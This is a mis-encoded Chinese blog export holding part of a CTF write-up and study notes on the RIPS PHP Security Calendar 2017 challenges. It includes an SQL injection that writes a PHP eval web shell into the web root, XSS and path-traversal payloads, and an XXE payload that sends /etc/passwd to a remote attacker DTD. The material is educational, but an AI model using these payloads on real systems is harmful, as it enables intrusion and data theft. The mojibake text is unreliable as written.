<p>è¿™é‡Œæ¶‰åŠåˆ°è¿ç®—ç¬¦ä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œandä¸å¦‚=ä¼˜å…ˆçº§é«˜ï¼Œå¯¼è‡´é€»è¾‘é—®é¢˜ï¼Œåªè¦æ»¡è¶³img_numä¸ºæ•°å­—å°±è¡Œã€‚img_firstå°±å¯ä»¥ç”¨å®ƒæ¥å˜¿å˜¿å˜¿äº†ã€‚<a href="http://php.net/manual/zh/language.operators.precedence.php">è¿ç®—ç¬¦ä¼˜å…ˆçº§</a></p>
<pre><code>ä¸€ä¸ªä¾‹å­è¯´æ˜andçš„ä¼˜å…ˆçº§ä¸åŒã€‚
Watch out for the difference of priority between &#39;and vs &amp;&amp;&#39; or &#39;|| vs or&#39;:
&lt;?php
$bool = true &amp;&amp; false;
var_dump($bool); // false, that&#39;s expected

$bool = true and false;
var_dump($bool); // true, ouch!
?&gt;
Because &#39;and/or&#39; have lower priority than &#39;=&#39; but &#39;||/&amp;&amp;&#39; have higher.</code></pre>
<pre><code>api.php?img_num=1&amp;img_first=0,1 UNION SELECT (select
0x3c3f706870206576616c28245f504f53545b2761275d293b3f3e into
outfile &#39;//var//www//html//images//p0.php&#39;)</code></pre>
<p>èœåˆ€è¿æ¥ã€‚</p>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><h4 id="1-å…«åå¹´ä»£çš„æ­Œï¼ˆ20åˆ†ï¼‰"><a href="#1-å…«åå¹´ä»£çš„æ­Œï¼ˆ20åˆ†ï¼‰" class="headerlink" title="1.å…«åå¹´ä»£çš„æ­Œï¼ˆ20åˆ†ï¼‰"></a>1.å…«åå¹´ä»£çš„æ­Œï¼ˆ20åˆ†ï¼‰</h4><p>æ–‡ä»¶æ ¼å¼æ”¹ä¸ºzipï¼Œæ‰“å¼€åå¾—åˆ°flagã€‚</p>
<h4 id="2-æ¥å¤ºæ——å•Šï¼ˆ70åˆ†ï¼‰"><a href="#2-æ¥å¤ºæ——å•Šï¼ˆ70åˆ†ï¼‰" class="headerlink" title="2.æ¥å¤ºæ——å•Šï¼ˆ70åˆ†ï¼‰"></a>2.æ¥å¤ºæ——å•Šï¼ˆ70åˆ†ï¼‰</h4><p>åˆ©ç”¨æ˜æ–‡æ”»å‡»ï¼Œ2ä¸ªæ–¹æ³•ã€‚</p>
<blockquote>
<p>2ç¯‡èµ„æ–™</p>
<p><a href="http://blog.csdn.net/ETF6996/article/details/54847911">http://blog.csdn.net/ETF6996/article/details/54847911</a></p>
<p><a href="https://github.com/evalsafe/TopicShare/blob/master/2015.10.10-ZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB-xmsec.md">https://github.com/evalsafe/TopicShare/blob/master/2015.10.10-ZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB-xmsec.md</a></p>
</blockquote>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/143558462.jpg"></p>
<h4 id="3-ç¥ç§˜çš„ä»£ç ï¼ˆ100åˆ†ï¼‰"><a href="#3-ç¥ç§˜çš„ä»£ç ï¼ˆ100åˆ†ï¼‰" class="headerlink" title="3.ç¥ç§˜çš„ä»£ç ï¼ˆ100åˆ†ï¼‰"></a>3.ç¥ç§˜çš„ä»£ç ï¼ˆ100åˆ†ï¼‰</h4><p>ä¸€ä¸ªå›¾ç‰‡éšå†™é¢˜ã€‚</p>
<p>ç»™å‡ºäº†ä¸€ä¸²å­—ç¬¦</p>
<pre><code>789c9d940b0e80300843af04f1fe7733313196f6cd5fc874930e3ae8dc6afb673dac8e717acea7631475216abc13a3b12eafee6bc4f017cffbb44bd93b738fac5ee7cfe7ca1ae6f01adef7a41628cd32f934fa1a7666169d3943d247430caf8acf9517afbd7e8a59ad93a9abd63badb3b779e85c69a49d8ce7f57cab8954a2736436f3acb312d4ad44937ee8eeccbb9c78ba9515fe953af91fa11ee7c1fd48544734d73b292cb37cb21d0a2d1b33</code></pre>
<p>æ ¹æ®æç¤ºIDATï¼Œpythonè¿›è¡Œzlibè§£å‹ã€‚</p>
<pre><code>#! /usr/bin/env python
import zlib
import binascii
IDAT = &quot;789c9d940b0e80300843af04f1fe7733313196f6cd5fc874930e3ae8dc6afb673dac8e717acea7631475216abc13a3b12eafee6bc4f017cffbb44bd93b738fac5ee7cfe7ca1ae6f01adef7a41628cd32f934fa1a7666169d3943d247430caf8acf9517afbd7e8a59ad93a9abd63badb3b779e85c69a49d8ce7f57cab8954a2736436f3acb312d4ad44937ee8eeccbb9c78ba9515fe953af91fa11ee7c1fd48544734d73b292cb37cb21d0a2d1b33&quot;.decode(&#39;hex&#39;)
#print IDAT
result = binascii.hexlify(zlib.decompress(IDAT))
print resul</code></pre>
<p>è¾“å‡ºçš„ç»“æœé™¤äº†1ï¼Œ0è¿˜æœ‰3ã€‚</p>
<pre><code>333033303330333033303330333033303330333033303330333033303330333033303330333033303330333033303330333033303330333033313331333133313331333133313330333133303330333033303331333033303331333033313331333133313331333133313330333033313330333033303330333033313330333133313330333033313331333033303331333033313330333033303330333033313330333033313330333133313331333033313330333033303331333033303331333133303331333033313330333133313331333033313330333033313330333133313331333033313330333033313330333033313330333133313330333033313330333133313331333033313330333033313330333133313331333033313330333133313331333133303330333033303330333033313330333133313331333033313330333033313330333033303330333033313330333133303330333033313330333033313330333033313330333033303330333033313330333033313331333133313331333133313330333133303331333033313330333133303331333033313331333133313331333133313330333033303330333033303330333033303330333033303330333033303331333133303331333033303330333033303330333033303330333033313331333133313330333133313330333033313330333033303331333133313331333133303331333133303330333133313330333033303330333133313331333133303330333033303331333133303331333033303331333033313330333033313331333133313330333033303330333033313331333133313331333133303331333033303331333033303330333133313330333133303330333033303330333033303331333033303330333033303331333033303330333033313330333133313330333033303330333133303331333133303330333033303331333133313331333033313330333133303330333133303331333133303331333033303331333033313331333033313330333033313331333033303330333033303331333133313330333033313330333133313331333133303330333133303331333133313330333033313331333133303330333033313330333033313330333133313330333133303330333133303331333133303331333033303330333033303331333033303330333033303331333133313331333133313331333133313331333033303330333033303331333033313330333033313330333033313330333133313330333133313331333133313331333133303331333133313331333133303330333033303330333033303330333033303330333033303330333033313330333033303331333033303331333033303330333133313330333133303330333033313331333133313331333133313330333033303330333133313330333033303331333033313330333133313331333033303330333033313330333033303330333033313330333133303330333033313330333133303331333033303330333133313331333133303330333033313330333133313331333033313330333033313331333033303331333133303331333133313331333133303330333033313330333033313330333133313331333033313330333133303330333033303331333033303331333033303330333033313331333033313330333033313330333133313331333033313330333133303331333133313330333033313331333133303331333133303330333133313330333033313330333033303330333033313330333133303330333133313330333033313331333033303331333033313331333133313330333033313331333133313331333133313330333133303330333033303330333033313331333133303330333133313330333033313330333033303330333033303330333033303330333033303330333033303330333033303330333033303330333033303330333033303330</code></pre>
<p>asciiç 30-&gt;0,31-&gt;1,33-&gt;3ï¼Œæ‰€ä»¥å…¨éƒ¨è½¬æ¢æˆæ•°å­—ï¼Œè½¬æ¢åçš„æ•°å­—ä¸¤ä¸¤æˆå¯¹ï¼Œä¸æ˜¯30å°±æ˜¯31ï¼Œåœ¨è½¬æ¢ä¸€æ¬¡ï¼Œå°±å…¨éƒ¨è½¬æ¢ä¸º1å’Œ0äº†ã€‚å…±729ä¸ªæ•°ï¼Œæ˜¯27çš„å¹³æ–¹ï¼Œåº”è¯¥æ˜¯ä¸ªæ­£æ–¹å½¢çš„å›¾ç‰‡ï¼ŒäºŒç»´ç å§ã€‚ç”¨pythonçš„PILåº“å¯ä»¥å®Œæˆç”»å›¾ã€‚Windowsè¦è£…PILåº“ï¼Œkaliè‡ªå¸¦ã€‚</p>
<pre><code>#!/usr/bin/env python
import Image
MAX = 27
pic = Image.new(&quot;RGB&quot;,(MAX, MAX))
str = &quot;000000000000000000000000000011111110100001001011111110010000010110011001010000010010111010001001101010111010010111010010010110010111010010111010111100000010111010010000010100010010010000010011111110101010101011111110000000000000001101000000000011110110010001111101100110000111100001101001010011110000011111101001000110100000001000001000010110000101100001111010100101101001011010011000001110010111100101110011100010010110100101101000001000001111111111000001010010010110111111101111100000000000000010001001000110100011111110000110001010111000010000010100010101000111100010111010011001101111100010010111010100001001000011010010111010101110011101100110010000010100110011001011110011111110100000011100110010000000000000000000000000000&quot;
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == &#39;1&#39;):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1

pic.show()
pic.save(&quot;flag.png&quot;)</code></pre>
<p>å¾—åˆ°flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/185550739.png" alt="mark"></p>
<h2 id="0X03-Reverse"><a href="#0X03-Reverse" class="headerlink" title="0X03 Reverse"></a>0X03 Reverse</h2><h4 id="1-å›ºä»¶åˆ†æï¼ˆ150åˆ†ï¼‰"><a href="#1-å›ºä»¶åˆ†æï¼ˆ150åˆ†ï¼‰" class="headerlink" title="1.å›ºä»¶åˆ†æï¼ˆ150åˆ†ï¼‰"></a>1.å›ºä»¶åˆ†æï¼ˆ150åˆ†ï¼‰</h4><p>ä¸‹è½½ä¸€ä¸ª.binçš„æ–‡ä»¶ï¼Œbinwalkæ‰“å¼€ã€‚binwalkæ˜¯ä¸€ä¸ªå›ºä»¶åˆ†æå·¥å…·ã€‚</p>
<p><a href="http://www.freebuf.com/sectool/15266.html">http://www.freebuf.com/sectool/15266.html</a></p>
<p>ç”¨binwalkæå–æ–‡ä»¶ï¼Œæ‰“å¼€åæœ‰ä¸€ä¸ªdecode.pyå’Œencodeflagæ–‡ä»¶ï¼Œæ˜ç™½äº†~~</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212920773.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212946150.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212957170.png" alt="mark"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RIPS-PHP-SECURITY-CALENDAR-2017å­¦ä¹ è®°å½•.md</title>
    <url>/2020/02/19/rips-php-security-calendar-2017-xue-xi-ji-lu/</url>
    <content><![CDATA[<blockquote>
<p>é¢˜ç›®åœ°å€ï¼š <a href="https://www.ripstech.com/php-security-calendar-2017/">https://www.ripstech.com/php-security-calendar-2017/</a></p>
<p>RIPSå›¢é˜Ÿåœ¨17å¹´12æœˆ1-24æ—¥å‘å¸ƒçš„æ–°å¹´ç¤¼ç‰©â€“æ¯æ—¥ä¸€ä¸ªPHPä»£ç æŒ‘æˆ˜ï¼ŒåŒ…å«äº†ä¸€äº›æ–°é¢–çš„çŸ¥è¯†ç‚¹ã€‚</p>
</blockquote>
<h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><p><strong>code:</strong></p>
<pre><code class="php">class Challenge &#123;
  const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
  private $file;
  private $whitelist;

  public function __construct($file) &#123;
    $this-&gt;file = $file;
    $this-&gt;whitelist = range(1, 24);
  &#125;

  public function __destruct() &#123;
    if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;
      move_uploaded_file(
        $this-&gt;file[&#39;tmp_name&#39;],
        self::UPLOAD_DIRECTORY . $this-&gt;file[&#39;name&#39;]
      );
    &#125;
  &#125;
&#125;

$challenge = new Challenge($_FILES[&#39;solution&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œé€ æˆæ¼æ´çš„ä»£ç ï¼š</p>
<pre><code class="php">if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;</code></pre>
<p>ä»£ç çš„ç›®çš„æ˜¯æƒ³è¦é€šè¿‡ <code>in_array()</code> æ¥åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦ä¸ºæ•´æ•°ï¼Œä½†æ˜¯è¿™é‡Œ<code>in_array()</code>å‡½æ•°æœªè®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¯¼è‡´äº†å®‰å…¨é—®é¢˜ã€‚</p>
<p><code>in_array</code>å‡½æ•°åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°æœªè®¾ç½®æ—¶é»˜è®¤ä¸ºfalseï¼Œåœ¨æ¯”è¾ƒçš„æ—¶å€™ä½¿ç”¨å®½æ¾æ¯”è¾ƒï¼Œåœ¨æ¯”è¾ƒæ–‡ä»¶åæ—¶ä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œä¾‹å¦‚<code>6shell.php</code>å°±ä¼šé€šè¿‡æ¯”è¾ƒæˆåŠŸä¸Šä¼ ï¼Œä¸‹é¢æ˜¯æ‰‹å†Œä¸­çš„å‡½æ•°å®šä¹‰ã€‚</p>
<blockquote>
<p> <strong>in_array</strong></p>
<p>in_array â€” æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</p>
<p><strong>è¯´æ˜</strong></p>
<p>bool in_array ( <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] )</p>
<p>åœ¨ <code>haystack</code> ä¸­æœç´¢ <code>needle</code>ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® <code>strict</code> åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒã€‚</p>
</blockquote>
<h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><p><strong>code:</strong></p>
<pre><code class="php">// composer require &quot;twig/twig&quot;
require &#39;vendor/autoload.php&#39;;

class Template &#123;
  private $twig;

  public function __construct() &#123;
    $indexTemplate = &#39;&lt;img &#39; .
      &#39;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#39; .
      &#39;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#39;;

    // Default twig setup, simulate loading
    // index.html file from disk
    $loader = new Twig\Loader\ArrayLoader([
      &#39;index.html&#39; =&gt; $indexTemplate
    ]);
    $this-&gt;twig = new Twig\Environment($loader);
  &#125;

  public function getNexSlideUrl() &#123;
    $nextSlide = $_GET[&#39;nextSlide&#39;];
    return filter_var($nextSlide, FILTER_VALIDATE_URL);
  &#125;

  public function render() &#123;
    echo $this-&gt;twig-&gt;render(
      &#39;index.html&#39;,
      [&#39;link&#39; =&gt; $this-&gt;getNexSlideUrl()]
    );
  &#125;
&#125;

(new Template())-&gt;render();</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p><code>twig</code> æ˜¯ PHP çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ã€‚è¯¥ä»£ç å­˜åœ¨XSSæ¼æ´ã€‚</p>
<p>ä»£ç ä¸­æœ‰ä¸¤å¤„è¿‡æ»¤ï¼Œç¬¬ä¸€å¤„åœ¨<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>ï¼Œä½¿ç”¨äº†FILTER_VALIDATE_URL è¿‡æ»¤å™¨ï¼Œæ²¡æœ‰ä½¿ç”¨æ ‡å¿—æ¥æ£€éªŒurlï¼Œæ‰€ä»¥æ­¤å¤„è¿‡æ»¤å¾ˆå¼±ï¼ŒåªéªŒè¯äº†<code>ï¼š//</code></p>
<blockquote>
<p> <a href="http://php.net/manual/zh/function.filter-var.php">*filter_var** </a>ï¼š (PHP 5 &gt;= 5.2.0, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p>
<p><strong>å®šä¹‰</strong> [mixed <strong>filter_var</strong> ( mixed<code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, mixed <code>$options</code> ]] )</p>
</blockquote>
<pre><code class="php">php &gt; var_dump(filter_var(&#39;qaq://lanvnal&#39;,FILTER_VALIDATE_URL));
string(13) &quot;qaq://lanvnal&quot;</code></pre>
<p>ç¬¬äºŒå¤„è¿‡æ»¤æ˜¯<code>&#123;&#123;link|escape&#125;&#125;</code>ï¼Œè¿™æ˜¯twigè‡ªå¸¦çš„è¿‡æ»¤å™¨ï¼Œåœ¨<a href="https://twig.symfony.com/doc/2.x/filters/escape.html">twigçš„æ–‡æ¡£</a>ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“å®ƒæ˜¯é€šè¿‡PHPçš„<code>htmlspecialchars</code>æ¥å®ç°çš„ï¼Œä»–ä¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p>
<pre><code>Internally, escape uses the PHP native htmlspecialchars function for the HTML escaping strategy.</code></pre>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php"><strong>htmlspecialchars</strong> </a>ï¼š(PHP 4, PHP 5, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p>
<p><strong>å®šä¹‰</strong> ï¼šstring <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(â€œdefault_charsetâ€) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
<pre><code>&amp; (&amp; ç¬¦å·)  ===============  &amp;amp;
&quot; (åŒå¼•å·)  ===============  &amp;quot;
&#39; (å•å¼•å·)  ===============  &amp;apos;
&lt; (å°äºå·)  ===============  &amp;lt;
&gt; (å¤§äºå·)  ===============  &amp;gt;</code></pre>
</blockquote>
<p>å¯ä»¥ä½¿ç”¨JavaScriptä¼ªåè®®ç»•è¿‡ã€‚egï¼š</p>
<pre><code>&lt;a href=&quot;javascript:;&quot;&gt;è¿™ä¸ªæ ‡ç­¾ä¸­çš„javascriptæ˜¯å•¥æ„æ€ï¼Ÿ&lt;/a&gt;

href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚
è¿™é‡Œçš„href=â€javascript:;â€ï¼Œå…¶ä¸­javascript:æ˜¯ä¼ªåè®®ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªé“¾æ¥æ¥è°ƒç”¨javascriptå‡½æ•°ã€‚javascript:æ˜¯è¡¨ç¤ºåœ¨è§¦å‘&lt;a&gt;é»˜è®¤åŠ¨ä½œæ—¶ï¼Œæ‰§è¡Œä¸€æ®µJavaScriptä»£ç </code></pre>
<p>æ‰€ä»¥ç»•è¿‡ä¸¤å¤„è¿‡æ»¤çš„payloadä¸ºï¼š<code>nextSlide=javascript://aaaï¼…250aalert(1)</code>ï¼ˆ%25æ˜¯%çš„urlç¼–ç ï¼‰</p>
<p><code>://</code>ç»•è¿‡äº†<code>FILTER_VALIDATE_URL</code>è¿‡æ»¤å™¨ï¼Œç»è¿‡<code>escape</code>è¿‡æ»¤å™¨ålinkå€¼ä¸º<code>javascript://aaa%0aalert(1)</code>ï¼Œ%0aä¸ºæ¢è¡Œç¬¦ï¼Œ<code>//</code>æ³¨é‡Šæ‰äº†æ¢è¡Œå‰é¢çš„å†…å®¹ï¼Œç„¶åç‚¹å‡»aæ ‡ç­¾é“¾æ¥å°±ä¼šè§¦å‘XSSã€‚</p>
<h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><p><strong>Code:</strong></p>
<pre><code class="php">function __autoload($className) &#123;
    include $className;
&#125;

$controllerName = $_GET[&#39;c&#39;];
$data = $_GET[&#39;d&#39;];

if (class_exists($controllerName)) &#123;
    $controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);
    $controller-&gt;render();
&#125; else &#123;
    echo &#39;There is no page with this name&#39;;
&#125;

class HomeController &#123;
    private $template;
    private $variables;

    public function __construct($template, $variables) &#123;
        $this-&gt;template = $template;
        $this-&gt;variables = $variables;
    &#125;

    public function render() &#123;
        if ($this-&gt;variables[&#39;new&#39;]) &#123;
            echo &#39;controller rendering new response&#39;;
        &#125; else &#123;
            echo &#39;controller rendering old response&#39;;
        &#125;
    &#125;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>ç¬¬ä¸€ä¸ªæ˜¯æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ç‰¹å®šPHPç‰ˆæœ¬ï¼ˆPHP5~5.3åŒ…å«5.3ç‰ˆæœ¬ï¼‰ã€‚</p>
<p> <strong>class_exists()</strong> å‡½æ•°æ¥åˆ¤æ–­ç”¨æˆ·ä¼ è¿‡æ¥çš„æ§åˆ¶å™¨æ˜¯å¦å­˜åœ¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºå­˜åœ¨ <strong>__autoload</strong> å‡½æ•°ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨ <strong>class_exists()</strong> å‡½æ•°å°±ä¼šè‡ªåŠ¨è°ƒç”¨æœ¬ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œè¿™é¢˜çš„æ–‡ä»¶åŒ…å«æ¼æ´å°±å‡ºç°åœ¨è¿™ä¸ªåœ°æ–¹ã€‚</p>
<p>payloadï¼š<code>../../../../../../passwd</code></p>
<p>ç¬¬äºŒä¸ªæ¼æ´åœ¨<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code></p>
<p>å®ä¾‹åŒ–ç±»çš„ç±»åå’Œä¼ å…¥ç±»çš„å‚æ•°å‡åœ¨ç”¨æˆ·çš„æ§åˆ¶ä¹‹ä¸‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´ï¼Œè°ƒç”¨PHPçš„å†…ç½®å‡½æ•°ï¼Œå¹¶é€šè¿‡ä¸Šé¢ä»£ç å®ä¾‹åŒ–ã€‚æˆ‘ä»¬å¯ä»¥å€ŸåŠ©PHPä¸­çš„<code>SimpleXMLElement</code>ç±»æ¥å®ŒæˆXXEæ”»å‡»ã€‚</p>
<p>payloadï¼š</p>
<pre><code>http://localhost/test2.php?c=SimpleXMLElement&amp;d=&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % remote SYSTEM &quot;http://å¤–ç½‘åœ°å€/evil.dtd&quot;&gt;
%remote;
%send;
]&gt;</code></pre>
<p>å…¶ä¸­çš„<code>evil.dtd</code>å†…å®¹æ˜¯:</p>
<pre><code>&lt;!ENTITY % all
        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;å¤–ç½‘åœ°å€/1.php?file=%file;&#39;&gt;&quot;
        &gt;
        %all;</code></pre>
<p>å…¶ä¸­çš„<code>1.php</code>çš„åœ°å€æ˜¯ï¼š</p>
<pre><code>file_put_contents(&quot;result.txt&quot;, $_GET[&#39;file&#39;]);</code></pre>
<p>è¿™æ ·å°±å®Œæˆäº†æ”»å‡»ã€‚</p>
<h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><p><strong>Code:</strong></p>
<pre><code class="php">class Login &#123;
  public function __construct($user, $pass) &#123;
    $this-&gt;loginViaXml($user, $pass);
  &#125;

  public function loginViaXml($user, $pass) &#123;
    if (
      (!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;
      (!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))
    ) &#123;
      $format = &#39;&lt;?xml version=&quot;1.0&quot;?&gt;&#39; .
        &#39;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#39;;
      $xml = sprintf($format, $user, $pass);
      $xmlElement = new SimpleXMLElement($xml);
      // Perform the actual login.
      $this-&gt;login($xmlElement);
    &#125;
  &#125;
&#125;

new Login($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>é—®é¢˜å‡ºåœ¨<code>strpos</code>å‡½æ•°å’ŒPHPçš„è‡ªåŠ¨ç±»å‹è½¬æ¢ä¸Šã€‚egï¼š</p>
<pre><code class="php">php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;a&#39;));
int(0)
php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;x&#39;));
bool(false)
php &gt; var_dump(0==false);
bool(true)</code></pre>
<p>å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„<code>username</code>å’Œ<code>password</code>çš„é¦–ä½å­—ç¬¦æ˜¯<code>&lt;</code>æˆ–è€…æ˜¯<code>&gt;</code>å°±å¯ä»¥ç»•è¿‡é™åˆ¶ï¼Œé‚£ä¹ˆæœ€åçš„pyaloadå°±æ˜¯ï¼š</p>
<pre><code>username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</code></pre>
<p>æœ€ç»ˆä¼ å…¥åˆ°<code>$this-&gt;login($xmlElement)</code>çš„<code>$xmlElement</code>å€¼æ˜¯<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚</p>
<h2 id="Day-5-Postcard"><a href="#Day-5-Postcard" class="headerlink" title="Day 5 - Postcard"></a>Day 5 - Postcard</h2><p><strong>code:</strong></p>
<pre><code class="php">class Mailer &#123;
  private function sanitize($email) &#123;
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;
      return &#39;&#39;;
    &#125;

    return escapeshellarg($email);
  &#125;

  public function send($data) &#123;
    if (!isset($data[&#39;to&#39;])) &#123;
      $data[&#39;to&#39;] = &#39;none@ripstech.com&#39;;
    &#125; else &#123;
      $data[&#39;to&#39;] = $this-&gt;sanitize($data[&#39;to&#39;]);
    &#125;

    if (!isset($data[&#39;from&#39;])) &#123;
      $data[&#39;from&#39;] = &#39;none@ripstech.com&#39;;
    &#125; else &#123;
      $data[&#39;from&#39;] = $this-&gt;sanitize($data[&#39;from&#39;]);
    &#125;

    if (!isset($data[&#39;subject&#39;])) &#123;
      $data[&#39;subject&#39;] = &#39;No Subject&#39;;
    &#125;

    if (!isset($data[&#39;message&#39;])) &#123;
      $data[&#39;message&#39;] = &#39;&#39;;
    &#125;

    mail($data[&#39;to&#39;], $data[&#39;subject&#39;], $data[&#39;message&#39;],
      &#39;&#39;, &quot;-f&quot; . $data[&#39;from&#39;]);
  &#125;
&#125;

$mailer = new Mailer();
$mailer-&gt;send($_POST);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>è€ƒå¯Ÿç”± <strong>php</strong> å†…ç½®å‡½æ•° <strong>mail</strong> æ‰€å¼•å‘çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹ <strong>php</strong> è‡ªå¸¦çš„ <strong>mail</strong> å‡½æ•°çš„ç”¨æ³•ï¼š</p>
<pre><code class="php">bool mail (
    string $to ,
    string $subject ,
    string $message [,
    string $additional_headers [,
    string $additional_parameters ]]
)</code></pre>
<p>å…¶å‚æ•°å«ä¹‰åˆ†åˆ«è¡¨ç¤ºå¦‚ä¸‹ï¼š</p>
<blockquote>
<ul>
<li>toï¼ŒæŒ‡å®šé‚®ä»¶æ¥æ”¶è€…ï¼Œå³æ¥æ”¶äºº</li>
<li>subjectï¼Œé‚®ä»¶çš„æ ‡é¢˜</li>
<li>messageï¼Œé‚®ä»¶çš„æ­£æ–‡å†…å®¹</li>
<li>additional_headersï¼ŒæŒ‡å®šé‚®ä»¶å‘é€æ—¶å…¶ä»–çš„é¢å¤–å¤´éƒ¨ï¼Œå¦‚å‘é€è€…Fromï¼ŒæŠ„é€CCï¼Œéšè—æŠ„é€BCC</li>
<li>additional_parametersï¼ŒæŒ‡å®šä¼ é€’ç»™å‘é€ç¨‹åºsendmailçš„é¢å¤–å‚æ•°ã€‚</li>
</ul>
</blockquote>
